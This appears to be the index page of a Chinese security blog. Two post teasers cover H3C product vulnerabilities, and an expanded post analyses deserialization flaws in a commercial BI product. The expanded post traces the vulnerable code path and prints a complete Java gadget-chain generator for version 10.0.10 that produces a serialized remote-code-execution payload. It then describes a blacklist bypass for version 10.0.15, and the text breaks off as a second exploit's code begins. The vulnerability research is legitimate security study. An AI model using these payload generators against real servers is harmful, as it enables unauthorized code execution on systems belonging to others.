<!DOCTYPE html>
<html lang="zn-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="不忘初心,方得始终">
<meta property="og:type" content="website">
<meta property="og:title" content="Zad&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Zad&#39;s blog">
<meta property="og:description" content="不忘初心,方得始终">
<meta property="og:locale" content="zn_CN">
<meta property="article:author" content="zad">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zn-CN'
  };
</script>

  <title>Zad's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Zad's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/02/H3CSecCenterSMP%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E7%BB%84%E5%90%88getshell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="zad">
      <meta itemprop="description" content="不忘初心,方得始终">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zad's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/02/H3CSecCenterSMP%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E7%BB%84%E5%90%88getshell/" class="post-title-link" itemprop="url">H3CSecCenterSMP安全管理平台组合getshell</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-12-02 17:38:41" itemprop="dateCreated datePublished" datetime="2024-12-02T17:38:41+08:00">2024-12-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-10 17:53:08" itemprop="dateModified" datetime="2024-12-10T17:53:08+08:00">2024-12-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          简单分析下微步爆出来的该产品的权限绕过漏洞和后台文件上传漏洞
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2024/12/02/H3CSecCenterSMP%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E7%BB%84%E5%90%88getshell/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/11/H3CCAS%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%B5%85%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="zad">
      <meta itemprop="description" content="不忘初心,方得始终">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zad's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/06/11/H3CCAS%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%B5%85%E6%9E%90/" class="post-title-link" itemprop="url">H3CCAS堡垒机浅析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-06-11 09:23:09" itemprop="dateCreated datePublished" datetime="2024-06-11T09:23:09+08:00">2024-06-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-11 09:33:01" itemprop="dateModified" datetime="2024-12-11T09:33:01+08:00">2024-12-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          简单分析学习下cas堡垒机的权限绕过漏洞
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2024/06/11/H3CCAS%E5%A0%A1%E5%9E%92%E6%9C%BA%E6%B5%85%E6%9E%90/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="zad">
      <meta itemprop="description" content="不忘初心,方得始终">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zad's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/" class="post-title-link" itemprop="url">某软BI反序列化历史浅析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-06-10 11:09:20" itemprop="dateCreated datePublished" datetime="2024-06-10T11:09:20+08:00">2024-06-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-02-17 13:11:33" itemprop="dateModified" datetime="2025-02-17T13:11:33+08:00">2025-02-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>BI反序列化接口出现了多个黑名单绕过，借此机会学下利用链的挖掘与工具的使用</p>
<h2 id="V10-0-10"><a href="#V10-0-10" class="headerlink" title="V10.0.10"></a>V10.0.10</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在<code>channel</code>接口直接对body用<code>WorkContext.handleMessage</code>进行处理</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20250217112024746.png" alt="image-20250217112024746"></p>
<p>跟入WorkContext.handleMessage方法，调用messageListener.handleMessage(var0)进行处理</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019144944-t0laibc.png" alt="image"></p>
<p>在跟入deserializeInvocation方法</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019144959-c6mh7rp.png" alt="image">这里deserialize用的InvocationSerializer</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019145013-z6werpa.png" alt="image"></p>
<p>在InvocationSerializer*#deserialize 方法中存在ObjectInputStream#*readObject，触发反序列化漏洞</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019145054-ek9tbkc.png" alt="image"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>参考hibernate利用链，直接将对应的org.hibernate.property.access.spi.Getter替换为BI中的全限定名即可com.fr.third.org.hibernate.property.access.spi.Getter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> finebi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">v10_0_10</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt;, DynamicDependencies &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">v10_0_10</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isApplicableJavaVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAtLeast(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGetter</span><span class="params">(Class&lt;?&gt; tplClass, String method)</span> <span class="keyword">throws</span> NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> makeHibernate5Getter(tplClass, method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeHibernate4Getter</span><span class="params">(Class&lt;?&gt; tplClass, String method)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; getterIf = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.Getter&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; basicGetter = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">        Reflections.setAccessible(bgCon);</span><br><span class="line">        <span class="keyword">if</span> (!method.startsWith(<span class="string">&quot;get&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Hibernate4 can only call getters&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> Character.toLowerCase(method.charAt(<span class="number">3</span>)) + method.substring(<span class="number">4</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">g</span> <span class="operator">=</span> bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">arr</span> <span class="operator">=</span> Array.newInstance(getterIf, <span class="number">1</span>);</span><br><span class="line">            Array.set(arr, <span class="number">0</span>, g);</span><br><span class="line">            <span class="keyword">return</span> arr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeHibernate5Getter</span><span class="params">(Class&lt;?&gt; tplClass, String method)</span> <span class="keyword">throws</span> NoSuchMethodException, SecurityException, ClassNotFoundException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; getterIf = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.access.spi.Getter&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; basicGetter = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">g</span> <span class="operator">=</span> bgCon.newInstance(tplClass, <span class="string">&quot;test&quot;</span>, tplClass.getDeclaredMethod(method));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arr</span> <span class="operator">=</span> Array.newInstance(getterIf, <span class="number">1</span>);</span><br><span class="line">        Array.set(arr, <span class="number">0</span>, g);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> makeGetter(tpl.getClass(), <span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> makeCaller(tpl, getters);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">makeCaller</span><span class="params">(Object tpl, Object getters)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> makeHibernate45Caller(tpl, getters);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">makeHibernate45Caller</span><span class="params">(Object tpl, Object getters)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">PojoComponentTuplizer</span> <span class="variable">tup</span> <span class="operator">=</span> (PojoComponentTuplizer)Reflections.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, <span class="string">&quot;getters&quot;</span>).set(tup, getters);</span><br><span class="line">        <span class="type">ComponentType</span> <span class="variable">t</span> <span class="operator">=</span> (ComponentType)Reflections.createWithConstructor(ComponentType.class, AbstractType.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;componentTuplizer&quot;</span>, tup);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertySpan&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertyTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;t&#125;);</span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>(t, (Object)<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>(t, (Object)<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="keyword">return</span> Gadgets.makeMap(v1, v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">makeHibernate3Caller</span><span class="params">(Object tpl, Object getters)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">entityEntityModeToTuplizerMappingClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">entityModeToTuplizerMappingClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.tuple.EntityModeToTuplizerMapping&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">typedValueClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.engine.TypedValue&quot;</span>);</span><br><span class="line">        <span class="type">PojoComponentTuplizer</span> <span class="variable">tup</span> <span class="operator">=</span> (PojoComponentTuplizer)Reflections.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, <span class="string">&quot;getters&quot;</span>).set(tup, getters);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, <span class="string">&quot;propertySpan&quot;</span>).set(tup, <span class="number">1</span>);</span><br><span class="line">        <span class="type">ComponentType</span> <span class="variable">t</span> <span class="operator">=</span> (ComponentType)Reflections.createWithConstructor(ComponentType.class, AbstractType.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hm.put(EntityMode.POJO, tup);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">emtm</span> <span class="operator">=</span> Reflections.createWithConstructor(entityEntityModeToTuplizerMappingClass, entityModeToTuplizerMappingClass, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;hm&#125;);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;tuplizerMapping&quot;</span>, emtm);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertySpan&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertyTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;t&#125;);</span><br><span class="line">        Constructor&lt;?&gt; typedValueConstructor = typedValueClass.getDeclaredConstructor(Type.class, Object.class, EntityMode.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">v1</span> <span class="operator">=</span> typedValueConstructor.newInstance(t, <span class="literal">null</span>, EntityMode.POJO);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">v2</span> <span class="operator">=</span> typedValueConstructor.newInstance(t, <span class="literal">null</span>, EntityMode.POJO);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="keyword">return</span> Gadgets.makeMap(v1, v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Filter.class&quot;</span>;</span><br><span class="line">        ObjectPayload&lt;?&gt; payload = (ObjectPayload)v10_0_10.class.newInstance();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objBefore</span> <span class="operator">=</span> payload.getObject(cmd);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(bao);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(gzout);</span><br><span class="line">        out.writeObject(objBefore);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        gzout.close();</span><br><span class="line">        FileUtils.writeByteArrayToFile(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;hello.ser&quot;</span>), bao.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="v10-0-15"><a href="#v10-0-15" class="headerlink" title="v10.0.15"></a>v10.0.15</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞触发点是在同一类中，只是10.0.15这里使用的是JDKSerializer.CustomObjectInputStream来处理序列化数据</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019145739-03hsi3k.png" alt="image"></p>
<p>跟入DKSerializer.CustomObjectInputStream发现实现了序列化接口并重写了resolveClass方法(重写resolverClass方法是常见的防御反序列化漏洞的手段)，将反序列化后的类与blacklist.txt中的黑名单进行匹配</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019145755-lcfwk0n.png" alt="image">在黑名单中过滤常见了利用类，如CB的BeanComparator，c3p0、transformer、hibernate等常见类，但是这里并没有过滤getOutputProperties和BadAttributeValueExpException,那么就存在黑名单绕过的可能性，这里我选择的是jackson作为利用链(比较可惜的是黑名单过滤了springframework.aop.framework.JdkDynamicAopProxy类导致不能稳定触发多发几次包即可)</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019145814-e3xdof7.png" alt="image"></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fr.third.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.apache.commons.io.FileUtils;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> 